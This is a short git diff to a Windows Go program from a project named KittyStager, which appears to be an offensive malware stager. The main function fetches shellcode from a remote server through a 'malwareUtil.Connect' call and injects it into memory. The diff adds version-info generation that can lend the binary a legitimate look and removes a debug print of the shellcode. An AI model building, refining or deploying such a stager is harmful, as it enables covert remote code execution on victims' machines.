@@ -1,3 +1,4 @@
+//go:generate goversioninfo
 //go:build windows
 
 package main
@@ -6,7 +7,6 @@ import (
 	"KittyStager/cmd/malwareUtil"
 	"KittyStager/cmd/util"
 	_ "embed"
-	"fmt"
 	"golang.org/x/sys/windows"
 )
 
@@ -19,7 +19,6 @@ func main() {
 		return
 	}
 	shellcode := malwareUtil.Connect(malConf)
-	fmt.Println(shellcode)
 	inject(shellcode)
 }
 
